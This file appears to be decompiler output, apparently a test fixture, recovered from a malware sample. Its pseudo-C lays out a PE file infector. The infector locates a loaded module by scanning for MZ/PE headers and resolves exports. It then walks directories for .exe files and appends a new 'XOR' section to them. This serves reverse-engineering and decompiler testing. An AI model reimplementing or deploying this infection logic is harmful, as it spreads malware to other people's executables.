// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0825/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00412000(word32 eax, word32 ecx, word32 edx, word32 ebx, word32 esi, word32 edi)
{
	fn0041200D(dwLoc20, dwArg00);
	fn0041200D(eax, dwArg1C);
	return;
}

void fn0041200D(word32 dwArg00, word32 dwArg20)
{
	Mem8[dwArg00 + 0x000005BF:word32] = Mem0[dwArg00 + 0x000005C3:word32];
	word32 esp_33 = fp + 0x00000004;
	word32 edi_32 = dwArg00 - 0x0000000D;
	word32 esi_11 = (dwArg20 & 0xFFFFF000) + 0x0000003C;
	while (Mem8[esi_11 + 0x00000000:word16] != 0x5A4D)
		esi_11 = esi_11 - 0x00001000;
	Mem19[dwArg00 + 0x000005B7:word32] = esi_11;
	word32 esi_21 = Mem19[esi_11 + 0x00000000:word32] + Mem19[dwArg00 + 0x000005B7:word32];
	if (Mem19[esi_21 + 0x00000000:word16] == 0x4550)
	{
		Mem53[dwArg00 + 0x000005BB:word32] = Mem19[esi_21 + 0x00000078:word32] + Mem19[dwArg00 + 0x000005B7:word32];
		word32 esi_54 = dwArg00 + 0x000005C7;
		do
		{
			word32 esi_58 = esi_54 + 0x00000004 + 0x00000001;
			word32 eax_59 = fn004120C4(esi_58, dwArg00 - 0x0000000D);
			Mem60[esi_58 - 0x00000004:word32] = eax_59;
			do
				esi_58 = esi_58 + 0x00000000;
			while (Mem60[esi_58 + 0x00000000:byte] != 0x00);
			esi_54 = esi_58 + 0x00000001;
		} while (Mem60[esi_58 + 0x00000005:byte] != 0x00);
		Mem60[dwArg00 + 0x00000634:word32]();
		Mem76[dwArg00 + 0x000006F2:word32] = eax_59;
		Mem76[dwArg00 + 0x00000644:word32]();
		Mem79[dwArg00 + 0x000006EE:word32] = eax_59;
		Mem79[dwArg00 + 0x00000662:word32]();
		word32 v10_80 = Mem79[dwArg00 + 0x000006D2:word32] + eax_59;
		Mem81[dwArg00 + 0x000006D2:word32] = v10_80;
		fn00412560(eax_59, dwArg00 - 0x0000000D);
		Mem84[fp - 0x0000000C:word32] = Mem81[dwArg00 + 0x000006F2:word32];
		esp_33 = fp - 0x0000000C;
		Mem84[dwArg00 + 0x00000653:word32]();
	}
	Mem37[esp_33 + 0x00000018:word32] = Mem19[edi_32 + 0x000005CC:word32] + edi_32;
	return;
}

word32 fn004120C4(word32 esi, word32 edi)
{
	word32 ebx_27 = Mem0[Mem0[edi + 0x000005C8:word32] + 0x0000000C:word32] + Mem0[edi + 0x000005C4:word32];
	word32 edx_21 = 0x00000000;
l004120D7:
	do
	{
		word16 ax_38 = DPB(ax, Mem0[ebx_27 + 0x00000000:byte], 8, 8);
		ebx_27 = ebx_27 + 0x00000001;
		ax = ax_38;
		byte al_42 = (byte) ax_38;
		byte ah_43 = SLICE(ax_38, byte, 8);
		if (ax_38 == 0x0000)
		{
			word32 eax_70 = Mem0[edi + 0x000005C4:word32];
			return eax_70 + (Mem0[Mem0[edi + 0x000005C8:word32] + 0x0000001C:word32] + eax_70)[(word32) (Mem0[Mem0[edi + 0x000005C8:word32] + 0x00000024:word32] + eax_70)[(edx_21 - 0x00000001) * 0x0002] * 0x00000004];
		}
	} while (al_42 == ah_43);
	edx_21 = edx_21 + 0x00000001;
	while (ah_43 != 0x00)
	{
		ah_43 = Mem0[ebx_27 + 0x00000000:byte];
		ax = DPB(ax, ah_43, 8, 8);
		ebx_27 = ebx_27 + 0x00000001;
	}
}

void fn0041212C(word32 eax, word32 edi)
{
	Mem0[edi + 0x000006B1:word32]();
	Mem0[edi + 0x000006C8:word32]();
	Mem0[edi + 0x000005D4:word32]();
	if ((eax & 0xFFFFFFFE) != 0xFFFFFFFF)
	{
		word32 edi_151;
		Mem106[edi + 0x000006EB:word32] = eax & 0xFFFFFFFE;
		Mem106[edi + 0x00000602:word32]();
		word32 esi_115 = Mem106[edi + 0x000006FB:word32];
		word32 esp_118 = fp - 0x00000034;
		Mem106[edi + 0x000005DF:word32]();
		edi_151 = edi;
		if ((eax & 0xFFFFFFFE) == 0x00000040)
		{
			edi_151 = edi;
			if (Mem106[esi_115 + 0x00000000:word16] == 0x5A4D)
			{
				word32 eax_156 = Mem106[esi_115 + 0x0000003C:word32];
				Mem157[edi + 0x000006F7:word32] = eax_156;
				Mem157[edi + 0x00000602:word32]();
				Mem164[edi + 0x000006EF:word32] = eax_156;
				Mem164[edi + 0x00000602:word32]();
				esp_118 = fp - 0x00000058;
				Mem164[edi + 0x000005DF:word32]();
				edi_151 = edi;
				if (eax_156 == 0x000000E0)
				{
					edi_151 = edi;
					if (Mem164[esi_115 + 0x00000000:word16] == 0x4550)
					{
						Mem164[edi + 0x00000602:word32]();
						word32 eax_188 = (word32) Mem164[esi_115 + 0x00000054:word16] - Mem164[edi + 0x000006F7:word32];
						esp_118 = fp - 0x00000070;
						Mem164[edi + 0x000005DF:word32]();
						edi_151 = edi;
						if (eax_188 == (word32) Mem164[esi_115 + 0x00000054:word16] - Mem164[edi + 0x000006F7:word32])
						{
							word32 ecx_200 = (word32) Mem164[esi_115 + 0x00000006:word16];
							word32 ecx_201 = ecx_200;
							edi_151 = edi;
							if (ecx_200 != 0x00000000)
							{
								word32 ebx_205 = esi_115 + 0x000000F8;
								word32 edx_206 = 0x00000000;
								do
								{
									edi_151 = edi;
									if (Mem164[ebx_205 + 0x00000000:word32] == 0x00524F58)
										goto l004123B6;
									word32 eax_220 = Mem164[ebx_205 + 0x00000008:word32];
									word32 eax_221 = eax_220;
									if (eax_220 == 0x00000000)
										eax_221 = Mem164[ebx_205 + 0x00000010:word32];
									word32 eax_227 = eax_221 + Mem164[ebx_205 + 0x0000000C:word32];
									if (eax_227 >u edx_206)
										edx_206 = eax_227;
									ebx_205 = ebx_205 + 0x00000028;
									ecx_201 = ecx_201 - 0x00000001;
								} while (ecx_201 != 0x00000000);
								word32 edx_239 = SEQ(0x00000000, edx_206) % Mem164[esi_115 + 0x00000038:word32];
								word32 eax_241 = SEQ(edx_239, edx_206) /u Mem164[esi_115 + 0x00000038:word32];
								if (edx_239 != 0x00000000)
									eax_241 = eax_241 + 0x00000001;
								word32 eax_249 = (word32) (Mem164[esi_115 + 0x00000038:word32] *u eax_241);
								Mem250[edi + 0x000006F3:word32] = eax_249;
								Mem253[edi + 0x000005D0:word32] = Mem250[esi_115 + 0x00000028:word32] - Mem250[edi + 0x000006F3:word32];
								Mem254[esi_115 + 0x00000028:word32] = eax_249;
								word32 eax_255 = Mem254[edi + 0x000006F3:word32];
								word32 edx_259 = SEQ(0x00000000, eax_255 + 0x00000800) % Mem254[esi_115 + 0x00000038:word32];
								word32 eax_261 = SEQ(edx_259, eax_255 + 0x00000800) /u Mem254[esi_115 + 0x00000038:word32];
								if (edx_259 != 0x00000000)
									eax_261 = eax_261 + 0x00000001;
								word32 eax_270 = (word32) (Mem254[esi_115 + 0x00000038:word32] *u eax_261);
								if (Mem254[esi_115 + 0x00000050:word32] <u eax_270)
									Mem373[esi_115 + 0x00000050:word32] = eax_270;
								else
									Mem375[esi_115 + 0x00000050:word32] = Mem254[esi_115 + 0x00000050:word32] + 0x00000800;
								word32 ebx_273 = (word32) Mem254[esi_115 + 0x00000006:word16];
								word16 v16_274 = Mem254[esi_115 + 0x00000006:word16] + 0x0001;
								Mem275[esi_115 + 0x00000006:word16] = v16_274;
								word32 ebx_277 = (ebx_273 << 0x00000003) + 0x000000F8 + (ebx_273 << 0x00000003) * 0x00000004;
								word32 ecx_281 = (word32) Mem275[esi_115 + 0x00000054:word16] - Mem275[edi + 0x000006F7:word32];
								edi_151 = edi;
								if (ecx_281 >=u ebx_277 + 0x00000028)
								{
									word32 eax_285 = Mem275[edi + 0x000006EF:word32];
									word32 edx_288 = SEQ(0x00000000, eax_285) % Mem275[esi_115 + 0x0000003C:word32];
									word32 ebx_284 = esi_115 + ebx_277;
									word32 eax_290 = SEQ(edx_288, eax_285) /u Mem275[esi_115 + 0x0000003C:word32];
									if (edx_288 != 0x00000000)
										eax_290 = eax_290 + 0x00000001;
									word32 eax_299 = (word32) (Mem275[esi_115 + 0x0000003C:word32] *u eax_290);
									Mem300[edi + 0x000006EF:word32] = eax_299;
									edi_151 = edi;
									if (Mem300[esi_115 + 0x000000D0:word32] != 0x00000000)
									{
										word32 edi_348 = Mem300[esi_115 + 0x00000054:word32] + esi_115;
										word32 ecx_350 = edi_348 - ebx_284;
										word32 esi_352 = edi_348 - 0x00000028;
										while (ecx_350 != 0x00000000)
										{
											Mem358[edi_348 + 0x00000000:byte] = Mem300[esi_352 + 0x00000000:byte];
											esi_352 = esi_352 - 0x00000001;
											edi_348 = edi_348 - 0x00000001;
											ecx_350 = ecx_350 - 0x00000001;
										}
										Mem368[esi_115 + 0x000000D0:word32] = Mem300[esi_115 + 0x000000D0:word32] + 0x00000028;
										edi_151 = edi;
									}
									Mem304[ebx_284 + 0x00000000:word32] = 0x00524F58;
									Mem305[ebx_284 + 0x00000004:word32] = 0x00000000;
									Mem306[ebx_284 + 0x00000008:word32] = 0x00000800;
									Mem308[ebx_284 + 0x0000000C:word32] = Mem306[edi_151 + 0x000006F3:word32];
									Mem309[ebx_284 + 0x00000010:word32] = 0x00000800;
									word32 edx_310 = Mem309[edi_151 + 0x000006EF:word32];
									Mem311[ebx_284 + 0x00000014:word32] = edx_310;
									Mem312[ebx_284 + 0x00000018:word32] = 0x00000000;
									Mem313[ebx_284 + 0x0000001C:word32] = 0x00000000;
									Mem314[ebx_284 + 0x00000020:word32] = 0x00000000;
									Mem315[ebx_284 + 0x00000024:word32] = 0xC0000060;
									Mem315[edi_151 + 0x00000602:word32]();
									Mem315[edi_151 + 0x000005EA:word32]();
									Mem315[edi_151 + 0x00000602:word32]();
									esp_118 = fp - 0x000000A0;
									Mem315[edi_151 + 0x000005EA:word32]();
								}
							}
						}
					}
				}
			}
		}
		word32 esp_152 = esp_118 - 0x00000004;
		Mem153[esp_152 + 0x00000000:word32] = Mem106[edi_151 + 0x000006EB:word32];
		Mem153[edi_151 + 0x000005F6:word32]();
	}
	Mem0[edi + 0x000006C8:word32]();
	return;
}

word32 fn004123C9(word32 eax, word32 edi, ptr32 ebpOut)
{
	word32 ebp_103 = fp - 0x00000004;
	Mem0[edi + 0x00000641:word32]();
	Mem0[edi + 0x00000651:word32]();
	word32 esi_30 = eax;
	word32 edx_203 = eax;
	byte al_38 = Mem0[esi_30 + 0x00000000:byte];
	esi_30 = esi_30 + 0x00000001;
	while (al_38 != 0x00)
	{
		Mem45[edx_203 + 0x00000000:byte] = al_38;
		edx_203 = edx_203 + 0x00000001;
		al_38 = Mem0[esi_30 + 0x00000000:byte];
		esi_30 = esi_30 + 0x00000001;
	}
	word32 ebx_202 = 0x00000040;
	if (0x00000040 != 0x00000000)
	{
		byte al_204 = Mem0[ebx_202 + 0x00000000:byte];
		ebx_202 = ebx_202 + 0x00000001;
		while (al_204 != 0x00)
		{
			Mem211[edx_203 + 0x00000000:byte] = al_204;
			edx_203 = edx_203 + 0x00000001;
			al_204 = Mem0[ebx_202 + 0x00000000:byte];
			ebx_202 = ebx_202 + 0x00000001;
		}
	}
	Mem58[edx_203 + 0x00000000:word16] = 0x005C;
	word32 edx_60 = eax + 0x00001000;
	word32 esi_62 = eax;
	word32 ebx_63 = edi + 0x000006E7;
	byte al_67 = Mem58[esi_62 + 0x00000000:byte];
	esi_62 = esi_62 + 0x00000001;
	while (al_67 != 0x00)
	{
		Mem74[edx_60 + 0x00000000:byte] = al_67;
		edx_60 = edx_60 + 0x00000001;
		al_67 = Mem58[esi_62 + 0x00000000:byte];
		esi_62 = esi_62 + 0x00000001;
	}
	do
	{
		byte al_79 = Mem58[ebx_63 + 0x00000000:byte];
		Mem81[edx_60 + 0x00000000:byte] = al_79;
		ebx_63 = ebx_63 + 0x00000001;
		edx_60 = edx_60 + 0x00000001;
	} while (al_79 != 0x00);
	Mem90[fp - 0x00000020:word32] = eax + 0x00002000;
	word32 eax_119 = eax + 0x00001000;
	word32 esp_104 = fp - 0x00000024;
	Mem90[edi + 0x0000060E:word32]();
	while (eax_119 != 0x00000000)
	{
		if (fn0041253E(0x00000005, edi) == 0x00000000)
		{
			word32 esi_126 = Mem90[ebp_103 - 0x00000008:word32];
			word32 eax_128 = Mem90[esi_126 + 0x00002000:word32];
			word32 eax_129 = eax_128 & 0x00000010;
			if ((eax_128 & 0x00000010) == 0x00000010)
				if (Mem90[esi_126 + 0x0000202C:byte] != 0x2E)
					fn004123C9(eax_128 & 0x00000010, edi, out ebp_103);
			else
			{
				word32 esi_140 = Mem90[ebp_103 - 0x00000008:word32] + 0x0000202C;
				while (Mem90[esi_140 + 0x00000000:byte] != 0x2E || Mem90[esi_140 + 0x00000001:byte] != 0x65 && Mem90[esi_140 + 0x00000001:byte] != 0x45 || (Mem90[esi_140 + 0x00000002:byte] != 0x78 && Mem90[esi_140 + 0x00000002:byte] != 0x58 || (Mem90[esi_140 + 0x00000003:byte] != 0x65 && Mem90[esi_140 + 0x00000003:byte] != 0x45 || Mem90[esi_140 + 0x00000004:byte] != 0x00)))
				{
					if (Mem90[esi_140 + 0x00000000:byte] == 0x00)
						goto l00412510;
					esi_140 = esi_140 + 0x00000001;
				}
				word32 esi_158 = Mem90[ebp_103 - 0x00000008:word32];
				word32 edx_157 = Mem90[edi + 0x000006FB:word32];
				word32 ebx_159 = esi_158 + 0x0000202C;
				byte al_163 = Mem90[esi_158 + 0x00000000:byte];
				esi_158 = esi_158 + 0x00000001;
				eax_129 = DPB(eax_129, al_163, 0, 8);
				while (al_163 != 0x00)
				{
					Mem170[edx_157 + 0x00000000:byte] = al_163;
					edx_157 = edx_157 + 0x00000001;
					al_163 = Mem90[esi_158 + 0x00000000:byte];
					esi_158 = esi_158 + 0x00000001;
					eax_129 = DPB(eax_129, al_163, 0, 8);
				}
				do
				{
					byte al_176 = Mem90[ebx_159 + 0x00000000:byte];
					Mem178[edx_157 + 0x00000000:byte] = al_176;
					ebx_159 = ebx_159 + 0x00000001;
					edx_157 = edx_157 + 0x00000001;
					eax_129 = DPB(eax_129, al_176, 0, 8);
				} while (al_176 != 0x00);
				fn0041212C(eax_129, edi);
			}
		}
		word32 eax_118 = Mem90[ebp_103 - 0x00000008:word32];
		word32 esp_122 = esp_104 - 0x00000004;
		Mem123[esp_122 + 0x00000000:word32] = eax_118 + 0x00002000;
		Mem125[esp_122 - 0x00000004:word32] = Mem123[ebp_103 - 0x0000000C:word32];
		eax_119 = eax_118 + 0x00002000;
		esp_104 = esp_122 - 0x00000004;
		Mem125[edi + 0x00000621:word32]();
	}
	word32 esp_192 = esp_104 - 0x00000004;
	Mem193[esp_192 + 0x00000000:word32] = Mem90[ebp_103 - 0x0000000C:word32];
	Mem193[edi + 0x00000633:word32]();
	Mem195[esp_192 - 0x00000004:word32] = Mem193[ebp_103 - 0x00000004:word32];
	Mem195[edi + 0x00000660:word32]();
	word32 ebp_198;
	*ebpOut = Mem195[esp_192 + 0x00000008:word32];
	return eax_119;
}

word32 fn0041253E(word32 eax, word32 edi)
{
	Mem12[edi + 0x000006DF:word32] = Mem0[edi + 0x000006DF:word32] *s 0x41C64E6D + 0x00003039;
	return SLICE(Mem12[edi + 0x000006DF:word32] *u eax, word32, 32);
}

void fn00412560(word32 eax, word32 edi)
{
	Mem0[edi + 0x00000680:word32]();
	word32 ebp_18;
	word32 eax_19 = fn004123C9(eax, edi, out ebp_18);
	Mem21[fp - 0x0000000C:word32] = 0x00001000;
	Mem23[fp - 0x00000010:word32] = Mem21[edi + 0x000006FB:word32];
	Mem23[edi + 0x00000699:word32]();
	word32 ebp_28;
	word32 ebp_34;
	word32 ebp_40;
	word32 ebp_46;
	fn004123C9(fn004123C9(fn004123C9(fn004123C9(eax_19, edi, out ebp_28), edi, out ebp_34), edi, out ebp_40), edi, out ebp_46);
	return;
}

